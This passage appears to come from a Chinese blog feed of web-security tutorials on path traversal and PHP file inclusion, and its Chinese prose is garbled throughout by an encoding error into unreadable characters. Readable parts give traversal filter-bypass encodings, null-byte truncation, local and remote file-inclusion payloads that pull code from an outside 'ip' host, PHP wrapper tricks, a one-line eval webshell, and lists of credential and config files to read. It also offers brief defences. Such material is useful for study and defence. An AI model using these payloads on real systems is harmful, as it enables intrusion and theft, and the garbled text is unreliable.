â€œï¼Œåœ¨å‚æ•°filenameç”¨çš„æ˜¯Base64åŠ å¯†ï¼Œè€Œæ”»å‡»è€…è¦æƒ³ç»•è¿‡ï¼Œåªéœ€ç®€å•çš„å°†æ–‡ä»¶ååŠ å¯†åŽå†é™„åŠ æäº¤å³å¯ã€‚æ‰€ä»¥è¯´ï¼Œé‡‡ç”¨ä¸€äº›æœ‰è§„å¾‹æˆ–è€…è½»æ˜“èƒ½è¯†åˆ«çš„åŠ å¯†æ–¹å¼ï¼Œä¹Ÿæ˜¯å­˜åœ¨é£Žé™©çš„ã€‚</p><p>(2) ç¼–ç ç»•è¿‡ï¼Œ</p><p>å°è¯•ä½¿ç”¨ä¸åŒçš„ç¼–ç è½¬æ¢è¿›è¡Œè¿‡æ»¤æ€§çš„ç»•è¿‡ï¼Œæ¯”å¦‚Urlç¼–ç ï¼Œé€šè¿‡å¯¹å‚æ•°è¿›è¡ŒUrlç¼–ç æäº¤ï¼Œâ€œdownfile.jsp?filename= %66%61%6E%2E%70%64%66â€œæ¥ç»•è¿‡ã€‚</p><p>é¿å¼€è¿‡æ»¤</p><p>ç¬¬ä¸€ç§æ˜¯è¿‡æ»¤æ–‡ä»¶åå‚æ•°ä¸­æ˜¯å¦å­˜åœ¨ä»»ä½•è·¯å¾„éåŽ†åºåˆ—(..)<br>å¦‚æžœç¨‹åºå°è¯•åˆ é™¤(..)æ¥å‡€åŒ–ç”¨æˆ·è¾“å…¥ï¼Œå¯ä»¥ç”¨<br>â€¦.// â€¦./ â€¦./\ â€¦.\<br>è¿›è¡ŒURLç¼–ç <br>ç‚¹â€“&gt;%2e åæ–œæ â€“&gt;%2f æ­£æ–œæ â€“&gt;%5c<br>è¿›è¡Œ16ä¸ºUnicodeç¼–ç <br>ç‚¹â€“&gt;%u002e åæ–œæ â€“&gt;%u2215 æ­£æ–œæ â€“&gt;%u2216<br>è¿›è¡ŒåŒå€URLç¼–ç <br>ç‚¹â€“&gt;%252e åæ–œæ â€“&gt;%u252f æ­£æ–œæ â€“&gt;%u255c<br>è¿›è¡Œè¶…é•¿UTF-8 Unicodeç¼–ç <br>ç‚¹â€“&gt;%c0%2e %e0$40%ae %c0ae<br>åæ–œæ â€“&gt;%c0af %e0%80af %c0%af<br>æ­£æ–œæ â€“&gt;%c0%5c %c0%80%5c</p><p>(3) ç›®å½•é™å®šç»•è¿‡ï¼›</p><p>åœ¨æœ‰äº›Webåº”ç”¨ç¨‹åºæ˜¯é€šè¿‡é™å®šç›®å½•æƒé™æ¥åˆ†ç¦»çš„ã€‚å½“ç„¶è¿™æ ·çš„æ–¹æ³•ä¸å€¼å¾—å¯å–çš„ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŸäº›ç‰¹æ®Šçš„ç¬¦å·â€œ<del>â€œæ¥ç»•è¿‡ã€‚å½¢å¦‚è¿™æ ·çš„æäº¤â€œdownfile.jsp?filename=</del>/../bootâ€ã€‚èƒ½è¿‡è¿™æ ·ä¸€ä¸ªç¬¦å·ï¼Œå°±å¯ä»¥ç›´æŽ¥è·³è½¬åˆ°ç¡¬ç›˜ç›®å½•ä¸‹äº†ã€‚</p><p>(4) ç»•è¿‡æ–‡ä»¶åŽç¼€è¿‡æ»¤ï¼›</p><p>ä¸€äº›Webåº”ç”¨ç¨‹åºåœ¨è¯»å–æ–‡ä»¶å‰ï¼Œä¼šå¯¹æäº¤çš„æ–‡ä»¶åŽç¼€è¿›è¡Œæ£€æµ‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ–‡ä»¶ååŽæ”¾ä¸€ä¸ªç©ºå­—èŠ‚çš„ç¼–ç ï¼Œæ¥ç»•è¿‡è¿™æ ·çš„æ–‡ä»¶ç±»åž‹çš„æ£€æŸ¥ã€‚<br>ä¾‹å¦‚ï¼š../../../../boot.ini%00.jpgï¼ŒWebåº”ç”¨ç¨‹åºä½¿ç”¨çš„Apiä¼šå…è®¸å­—ç¬¦ä¸²ä¸­åŒ…å«ç©ºå­—ç¬¦ï¼Œå½“å®žé™…èŽ·å–æ–‡ä»¶åæ—¶ï¼Œåˆ™ç”±ç³»ç»Ÿçš„Apiä¼šç›´æŽ¥æˆªçŸ­ï¼Œè€Œè§£æžä¸ºâ€œ../../../../boot.iniâ€ã€‚<br>åœ¨ç±»Unixçš„ç³»ç»Ÿä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨Urlç¼–ç çš„æ¢è¡Œç¬¦ï¼Œä¾‹å¦‚ï¼š../../../etc/passwd%0a.jpgå¦‚æžœæ–‡ä»¶ç³»ç»Ÿåœ¨èŽ·å–å«æœ‰æ¢è¡Œç¬¦çš„æ–‡ä»¶åï¼Œä¼šæˆªçŸ­ä¸ºæ–‡ä»¶åã€‚ä¹Ÿå¯ä»¥å°è¯•%20ï¼Œä¾‹å¦‚: ../../../index.jsp%20</p><p>(5) ç»•è¿‡æ¥è·¯éªŒè¯ã€‚<br>Http Referer :    HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»Žå“ªä¸ªé¡µé¢é“¾æŽ¥è¿‡æ¥çš„</p><p>åœ¨ä¸€äº›Webåº”ç”¨ç¨‹åºä¸­ï¼Œä¼šæœ‰å¯¹æäº¤å‚æ•°çš„æ¥è·¯è¿›è¡Œåˆ¤æ–­çš„æ–¹æ³•ï¼Œè€Œç»•è¿‡çš„æ–¹æ³•å¯ä»¥å°è¯•é€šè¿‡åœ¨ç½‘ç«™ç•™è¨€æˆ–è€…äº¤äº’çš„åœ°æ–¹æäº¤Urlå†ç‚¹å‡»æˆ–è€…ç›´æŽ¥ä¿®æ”¹Http Refererå³å¯ï¼Œè¿™ä¸»è¦æ˜¯åŽŸå› Http Refereræ˜¯ç”±å®¢æˆ·ç«¯æµè§ˆå™¨å‘é€çš„ï¼ŒæœåŠ¡å™¨æ˜¯æ— æ³•æŽ§åˆ¶çš„ï¼Œè€Œå°†æ­¤å˜é‡å½“ä½œä¸€ä¸ªå€¼å¾—ä¿¡ä»»æºæ˜¯é”™è¯¯çš„ã€‚</p><p>é˜²èŒƒéåŽ†è·¯å¾„æ¼æ´ž<br>åœ¨é˜²èŒƒéåŽ†è·¯å¾„æ¼æ´žçš„æ–¹æ³•ä¸­ï¼Œæœ€æœ‰æ•ˆçš„æ˜¯æƒé™çš„æŽ§åˆ¶ï¼Œè°¨æ…Žçš„å¤„ç†å‘æ–‡ä»¶ç³»ç»ŸAPIä¼ é€’è¿‡æ¥çš„å‚æ•°è·¯å¾„ã€‚ä¸»è¦æ˜¯å› ä¸ºå¤§å¤šæ•°çš„ç›®å½•æˆ–è€…æ–‡ä»¶æƒé™å‡æ²¡æœ‰å¾—åˆ°åˆç†çš„é…ç½®ï¼Œè€ŒWebåº”ç”¨ç¨‹åºå¯¹æ–‡ä»¶çš„è¯»å–å¤§å¤šä¾èµ–äºŽç³»ç»Ÿæœ¬èº«çš„APIï¼Œåœ¨å‚æ•°ä¼ é€’çš„è¿‡ç¨‹ï¼Œå¦‚æžœæ²¡æœ‰å¾—ä¸¥è°¨çš„æŽ§åˆ¶ï¼Œåˆ™ä¼šå‡ºçŽ°è¶ŠæƒçŽ°è±¡çš„å‡ºçŽ°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨ç¨‹åºå¯ä»¥é‡‡å–ä»¥ä¸‹é˜²å¾¡æ–¹æ³•ï¼Œæœ€å¥½æ˜¯ç»„åˆä½¿ç”¨ã€‚<br>(1) æ•°æ®å‡€åŒ–ï¼Œå¯¹ç½‘ç«™ç”¨æˆ·æäº¤è¿‡æ¥çš„æ–‡ä»¶åè¿›è¡Œç¡¬ç¼–ç æˆ–è€…ç»Ÿä¸€ç¼–ç ï¼Œå¯¹æ–‡ä»¶åŽç¼€è¿›è¡Œç™½åå•æŽ§åˆ¶ï¼Œå¯¹åŒ…å«äº†æ¶æ„çš„ç¬¦å·æˆ–è€…ç©ºå­—èŠ‚è¿›è¡Œæ‹’ç»ã€‚<br>(2) Webåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨chrootedçŽ¯å¢ƒè®¿é—®åŒ…å«è¢«è®¿é—®æ–‡ä»¶çš„ç›®å½•ï¼Œæˆ–è€…ä½¿ç”¨ç»å¯¹è·¯å¾„+å‚æ•°æ¥æŽ§åˆ¶è®¿é—®ç›®å½•ï¼Œä½¿å…¶å³ä½¿æ˜¯è¶Šæƒæˆ–è€…è·¨è¶Šç›®å½•ä¹Ÿæ˜¯åœ¨æŒ‡å®šçš„ç›®å½•ä¸‹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:æ–‡ä»¶åŒ…å«æ¼æ´ž</title>
      <link href="2021/05/20/web-wen-jian-bao-han-lou-dong/"/>
      <url>2021/05/20/web-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="æ–‡ä»¶åŒ…å«åŽŸç†"><a href="#æ–‡ä»¶åŒ…å«åŽŸç†" class="headerlink" title="æ–‡ä»¶åŒ…å«åŽŸç†"></a>æ–‡ä»¶åŒ…å«åŽŸç†</h3><h4 id="1-æ–‡ä»¶åŒ…å«"><a href="#1-æ–‡ä»¶åŒ…å«" class="headerlink" title="1.æ–‡ä»¶åŒ…å«"></a>1.æ–‡ä»¶åŒ…å«</h4><p>å¼€å‘äººå‘˜å°†ç›¸åŒçš„å‡½æ•°å†™å…¥å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œéœ€è¦ä½¿ç”¨æŸä¸ªå‡½æ•°æ—¶ç›´æŽ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œæ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§æ–‡ä»¶è°ƒç”¨çš„è¿‡ç¨‹ç§°æ–‡ä»¶åŒ…å«</p><h4 id="2-æ–‡ä»¶åŒ…å«æ¼æ´ž"><a href="#2-æ–‡ä»¶åŒ…å«æ¼æ´ž" class="headerlink" title="2.æ–‡ä»¶åŒ…å«æ¼æ´ž"></a>2.æ–‡ä»¶åŒ…å«æ¼æ´ž</h4><p>å¼€å‘äººå‘˜ä¸ºäº†ä½¿ä»£ç æ›´çµæ´»ï¼Œä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä»Žè€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æ¶æ„è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ž</p><h3 id="æ–‡ä»¶åŒ…å«åˆ†ç±»"><a href="#æ–‡ä»¶åŒ…å«åˆ†ç±»" class="headerlink" title="æ–‡ä»¶åŒ…å«åˆ†ç±»"></a>æ–‡ä»¶åŒ…å«åˆ†ç±»</h3><h4 id="1-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#1-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="1.æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>1.æœ¬åœ°æ–‡ä»¶åŒ…å«</h4><p>åŒ…å«æœåŠ¡å™¨æœ¬èº«å­˜åœ¨çš„æ¶æ„æ–‡ä»¶<br>a.txt</p><pre><code>&lt;?php phpinfo();?&gt;</code></pre><p>b.php</p><pre><code>&lt;?php$b=$_GET['id'];include($b);?&gt;</code></pre><p>payload:</p><pre><code>localhost/b.php?id=a.txt //è¿”å›žphpinfoé¡µé¢</code></pre><p>æ³¨ï¼š<br>    1.ä¸¤ä¸ªæ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ï¼ˆè‹¥ä¸åœ¨åŒä¸€ç›®å½•è¿™è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„å¿…é¡»å†™ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„ï¼‰<br>    2.è¢«åŒ…å«çš„é¡µé¢çš„åŽç¼€æ— è®ºæ˜¯ä»€ä¹ˆéƒ½ä¼šå½“åšPHPè§£æž</p><h4 id="2-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#2-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="2.è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>2.è¿œç¨‹æ–‡ä»¶åŒ…å«</h4><p>åŒ…å«å…¶ä»–ç½‘ç«™ä¸Šçš„æ¶æ„æ–‡ä»¶<br>è¿œç¨‹æ–‡ä»¶åŒ…å«åˆ©ç”¨æ¡ä»¶ï¼šåœ¨php.iniä¸­allow_url_fopen=onã€allow_url_include=on</p><p>payloadï¼š</p><pre><code>localhost/b.php?id=http://ip/æ–‡ä»¶è·¯å¾„</code></pre><p>â€‹    1</p><p>æ³¨ï¼š<br>    è¿œç¨‹åŒ…å«çš„æ–‡ä»¶è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„</p><h3 id="å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠåº”ç”¨å‡½æ•°"><a href="#å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠåº”ç”¨å‡½æ•°" class="headerlink" title="å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠåº”ç”¨å‡½æ•°"></a>å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠåº”ç”¨å‡½æ•°</h3><p>php</p><pre><code>1.include():æ‰§è¡Œåˆ°includeå‡½æ•°æ—¶æ‰æ–‡ä»¶åŒ…å«ï¼Œæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ—¶ï¼Œå‘å‡ºè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­è¿è¡Œ2.require():åªè¦ç¨‹åºä¸€è¿è¡Œå°±è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ—¶ï¼Œäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œè„šæœ¬åœæ­¢è¿è¡Œ3.include_once()ä¸Žrequire():ä¸Žä¸Šè¿°å‡½æ•°ä¸€æ ·ï¼Œåªæ˜¯è‹¥æ–‡ä»¶ä¸­ä»£ç å·²ç»è¢«åŒ…å«åˆ™ä¸ä¼šå†æ¬¡åŒ…å«</code></pre><p>jsp/servlet</p><pre><code>1.ava.io.file()2.java.io.filereader()</code></pre><p>asp</p><pre><code>1.include file2.include virtual</code></pre><h3 id="å„ä¸ªåè®®å®žçŽ°å‘½ä»¤æ‰§è¡Œ"><a href="#å„ä¸ªåè®®å®žçŽ°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å„ä¸ªåè®®å®žçŽ°å‘½ä»¤æ‰§è¡Œ"></a>å„ä¸ªåè®®å®žçŽ°å‘½ä»¤æ‰§è¡Œ</h3><p>%00æˆªæ–­</p><pre><code>æ˜¯å¦éœ€è¦æˆªæ–­æ˜¯æ ¹æ®åŒ…å«å‡½æ•°åŽæœ‰æ²¡æœ‰å¯¹åŒ…å«çš„æ–‡ä»¶è¿›è¡Œæ‹¼æŽ¥ä¸€ä¸ªåŽç¼€ï¼Œå¦‚æžœæœ‰å°±éœ€è¦ä½¿ç”¨%00è¿›è¡Œæˆªæ–­å½“phpç‰ˆæœ¬&lt;=5.2ä½¿ç”¨%00æˆªæ–­</code></pre><p>fileï¼š//:ç”¨äºŽè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p><pre><code>æ¡ä»¶(php.ini)ï¼š    allow_url_fopen   off/on    allow_url_include off/onä½¿ç”¨æ–¹æ³•ï¼šfileï¼š//[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</code></pre><p>php://:è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµ</p><pre><code> phpï¼š//filterï¼šç”¨äºŽè¯»å–æºç å¹¶è¿›è¡Œbash64ç¼–ç è¾“å‡ºï¼›    æ¡ä»¶ï¼ˆphp.iniï¼‰ï¼š        allow_url_fope   off/on        allow_url_include off/on    phpï¼š//inputï¼šå¯ä»¥è®¿é—®è¯·æ±‚çš„åŽŸå§‹æ•°æ®çš„åªè¯»æµ,å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼›    æ¡ä»¶(php.ini)ï¼š        allow_url_fope   off/on        allow_url_include on    php://stdinæ˜¯åªè¯»çš„ï¼Œphp://stdout å’Œ php://stderr æ˜¯åªå†™çš„ã€‚    php://output æ˜¯ä¸€ä¸ªåªå†™çš„æ•°æ®æµï¼Œ å…è®¸ä½ ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼ å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚    php://fd å…è®¸ç›´æŽ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚</code></pre><p>zip://,bzip://,zlib://ï¼šå‡å±žäºŽåŽ‹ç¼©æµï¼Œå¯ä»¥è®¿é—®åŽ‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œä¸éœ€è¦ä¼ åŽç¼€å</p><pre><code>æ¡ä»¶ï¼š    allow_url_fope   off/on    allow_url_include off/onzip://ä½¿ç”¨æ–¹æ³•ï¼š    zip://[åŽ‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[åŽ‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]bzip2://ä½¿ç”¨æ–¹æ³•ï¼š    bzip2://file.bz2zlib://ä½¿ç”¨æ–¹æ³•ï¼š    zlib://file.gz</code></pre><p>data://</p><pre><code>æ¡ä»¶ï¼š    allow_url_fope   on    allow_url_include on</code></pre><h3 id="ç›´æŽ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ï¼š"><a href="#ç›´æŽ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ï¼š" class="headerlink" title="ç›´æŽ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ï¼š"></a>ç›´æŽ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ï¼š</h3><p>Eval()ã€assert()ã€system()ã€exec()ã€shell_exec()ã€passthru()ã€</p><p>Escapeshellcmd()ã€pcntl_exec()ç­‰å°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p><p>1ã€eval()</p><p>eval() å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ï¼Œå¦‚å¸¸è§çš„ä¸€å¥è¯åŽé—¨ç¨‹åºï¼š<!--?phpeval($_POST[cmd])?--></p><p>2ã€assert() ä¸Ževalç±»ä¼¼ï¼Œå­—ç¬¦ä¸²è¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œï¼›</p><p>PHPæ–‡ä»¶åŒ…å«æ¼æ´ž<br>å¼€å‘äººå‘˜éƒ½å¸Œæœ›ä»£ç æ›´åŠ çµæ´»ï¼Œæ‰€ä»¥é€šå¸¸ä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ã€‚æ­£æ˜¯è¿™ç§çµæ´»æ€§ï¼Œä»Žè€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´žã€‚</p><h3 id="å¸¸è§çš„å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼š"><a href="#å¸¸è§çš„å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼š" class="headerlink" title="å¸¸è§çš„å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼š"></a>å¸¸è§çš„å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼š</h3><p>PHP:include()ã€include_once()ã€require()ã€require_once()ç­‰ï¼›<br>1.phpæ–‡ä»¶åŒ…å«å¯ä»¥ç›´æŽ¥æ‰§è¡ŒåŒ…å«æ–‡ä»¶çš„ä»£ç ï¼ŒåŒ…å«çš„æ–‡ä»¶æ ¼å¼ä¸å—ä»»ä½•é™åˆ¶<br>åœ¨ php ä¸­æä¾›äº†å››ä¸ªæ–‡ä»¶åŒ…å«å‡½æ•°ï¼š<br>(1) Require: æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯(E_COMPILE_ERROR)ï¼Œå¹¶åœæ­¢è„šæœ¬ï¼›<br>(2) Includeï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶åªä¼šäº§ç”Ÿä¸€ä¸ª(E_warinng)ï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œï¼›<br>(3) Require_onceï¼šä¸Ž include ç±»ä¼¼ä¼šäº§ç”Ÿè­¦å‘Šï¼ŒåŒºåˆ«æ˜¯å¦‚æžœæ–‡ä»¶ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†<br>æ¬¡è¢«åŒ…å«ï¼›</p><p>2ã€æ–‡ä»¶åŒ…å«æ¼æ´žåˆ©ç”¨çš„å‰ææ¡ä»¶ï¼š<br>ï¼ˆ1ï¼‰web åº”ç”¨é‡‡ç”¨ include ç­‰æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¹¶ä¸”éœ€è¦åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ˜¯é€šè¿‡ç”¨æˆ·ä¼ è¾“å‚<br>æ•°çš„æ–¹å¼å¼•å…¥ï¼›<br>ï¼ˆ2ï¼‰ç”¨æˆ·èƒ½å¤ŸæŽ§åˆ¶åŒ…å«æ–‡ä»¶çš„å‚æ•°ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶å¯è¢«å½“å‰é¡µé¢è®¿é—®ï¼›</p><p>3ã€æ–‡ä»¶åŒ…å«èŽ·å– webshell çš„æ¡ä»¶ï¼š<br>ï¼ˆ1ï¼‰æ”»å‡»è€…éœ€è¦çŸ¥é“æ–‡ä»¶å­˜æ”¾çš„ç‰©ç†è·¯å¾„ï¼›<br>ï¼ˆ2ï¼‰å¯¹ä¸Šä¼ æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼›<br>ï¼ˆ3ï¼‰å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´žï¼›</p><p>4ã€å…¸åž‹ç‰¹å¾<br>å˜é‡çš„å€¼ä¸ºä¸€ä¸ªé¡µé¢ï¼š<br>?page=a.php<br>?home=b.html<br>?file=contentâ€¦</p><p>5ã€å¸¸è§çš„æ•æ„Ÿè·¯å¾„ï¼š<br>1 Windows<br>C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬<br>C:\windows\system32\inetsrv\MetaBase.xml //IIS é…ç½®æ–‡ä»¶<br>C:\windows\repair\sam //å­˜å‚¨ windows ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç <br>C:\Program Files\mysql\my.ini //mysql é…ç½®<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\windows\php.ini //php é…ç½®ä¿¡æ¯<br>C:\windows\my.ini //mysql é…ç½®æ–‡ä»¶</p><p>2 UNIX/Linux<br>/etc/passwd<br>/usr/local/app/apache2/conf/httpd.conf //apache2 é»˜è®¤é…ç½®æ–‡ä»¶<br>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿç½‘ç«™è®¾ç½®<br>/usr/local/app/php5/lib/php.ini //PHP ç›¸å…³é…ç½®<br>/etc/httpd/conf/httpd.conf //apache<br>/etc/php5/apache2/php.ini //ubuntu ç³»ç»Ÿçš„é»˜è®¤è·¯å¾„</p><p>æ—¥å¿—é»˜è®¤è·¯å¾„<br>(1) apache+Linux æ—¥å¿—é»˜è®¤è·¯å¾„<br>/etc/httpd/logs/access_log<br>æˆ–è€…<br>/var/log/httpd/access_log</p><p>(2) apache+win2003 æ—¥å¿—é»˜è®¤è·¯å¾„<br>D:\xampp\apache\logs\access.log<br>D:\xampp\apache\logs\error.log</p><p>(3) IIS6.0+win2003 é»˜è®¤æ—¥å¿—æ–‡ä»¶<br>C:\WINDOWS\system32\Logfiles</p><p>(4) IIS7.0+win2003 é»˜è®¤æ—¥å¿—æ–‡ä»¶<br>%SystemDrive%\inetpub\logs\LogFiles</p><p>(5) nginx æ—¥å¿—æ–‡ä»¶<br>æ—¥å¿—æ–‡ä»¶åœ¨ç”¨æˆ·å®‰è£…ç›®å½• logs ç›®å½•ä¸‹<br>ä»¥æˆ‘çš„å®‰è£…è·¯å¾„ä¸ºä¾‹/usr/local/nginx,<br>é‚£æˆ‘çš„æ—¥å¿—ç›®å½•å°±æ˜¯åœ¨/usr/local/nginx/logsé‡Œ<br>web ä¸­é—´ä»¶é»˜è®¤é…ç½®<br>(1) apache+linux é»˜è®¤é…ç½®æ–‡ä»¶<br>/etc/httpd/conf/httpd.conf<br>æˆ–è€…<br>index.php?page=/etc/init.d/httpd<br>(2) IIS6.0+win2003 é…ç½®æ–‡ä»¶<br>C:/Windows/system32/inetsrv/metabase.xml<br>(3) IIS7.0+WIN é…ç½®æ–‡ä»¶<br>C:\Windows\System32\inetsrv\config\applicationHost.config</p><h3 id="å¸¸è§çš„ç»•è¿‡ä¸Žé˜²å¾¡"><a href="#å¸¸è§çš„ç»•è¿‡ä¸Žé˜²å¾¡" class="headerlink" title="å¸¸è§çš„ç»•è¿‡ä¸Žé˜²å¾¡"></a>å¸¸è§çš„ç»•è¿‡ä¸Žé˜²å¾¡</h3><h4 id="1-00æˆªæ–­ï¼ˆphp-lt-5-3-4ï¼‰"><a href="#1-00æˆªæ–­ï¼ˆphp-lt-5-3-4ï¼‰" class="headerlink" title="1.%00æˆªæ–­ï¼ˆphp<5.3.4ï¼‰"></a>1.%00æˆªæ–­ï¼ˆphp&lt;5.3.4ï¼‰</h4><pre><code>è¯´æ˜Žï¼š    PHPå†…æ ¸æ˜¯ç”±Cè¯­è¨€å®žçŽ°çš„ï¼Œå› æ­¤ä½¿ç”¨äº†Cè¯­è¨€ä¸­çš„ä¸€äº›å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ã€‚åœ¨è¿žæŽ¥å­—ç¬¦ä¸²æ—¶ï¼Œ0å­—(x00)å°†ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸç¬¦ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œæ”»å‡»è€…åªè¦åœ¨æœ€åŽåŠ å…¥ä¸€ä¸ª0å­—èŠ‚ï¼Œå°±èƒ½æˆªæ–­  fileå˜é‡ä¹‹åŽçš„å­—ç¬¦ä¸²ã€‚é˜²å¾¡ï¼š    ç¦ç”¨0å­—èŠ‚</code></pre><h4 id="2-è¶…é•¿å­—ç¬¦æˆªæ–­"><a href="#2-è¶…é•¿å­—ç¬¦æˆªæ–­" class="headerlink" title="2.è¶…é•¿å­—ç¬¦æˆªæ–­"></a>2.è¶…é•¿å­—ç¬¦æˆªæ–­</h4><pre><code>åˆ©ç”¨ï¼š    åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦0å­—èŠ‚è€Œè¾¾åˆ°æˆªæ–­çš„ç›®çš„ã€‚    æˆ‘ä»¬çŸ¥é“ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowä¸‹256å­—èŠ‚ã€linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åŽçš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒã€‚    è€Œåˆ©ç”¨"./"çš„æ–¹å¼å³å¯æž„é€ å‡ºè¶…é•¿ç›®å½•å­—ç¬¦ä¸²é˜²å¾¡ï¼š    é™åˆ¶ç”¨æˆ·è¾“å…¥å­—ç¬¦é•¿åº¦</code></pre><h4 id="3-ä»»æ„ç›®å½•éåŽ†"><a href="#3-ä»»æ„ç›®å½•éåŽ†" class="headerlink" title="3.ä»»æ„ç›®å½•éåŽ†"></a>3.ä»»æ„ç›®å½•éåŽ†</h4><pre><code>åˆ©ç”¨ï¼š    ä½¿ç”¨"../../../"è¿™æ ·çš„æ–¹å¼æ¥è¿”å›žåˆ°ä¸Šå±‚ç›®å½•ä¸­ï¼Œè¿™ç§æ–¹å¼åˆè¢«ç§°ä¸º"ç›®å½•éåŽ†(Path Traversal)"ã€‚å¸¸è§çš„ç›®å½•éåŽ†æ¼æ´žï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸åŒçš„ç¼–ç 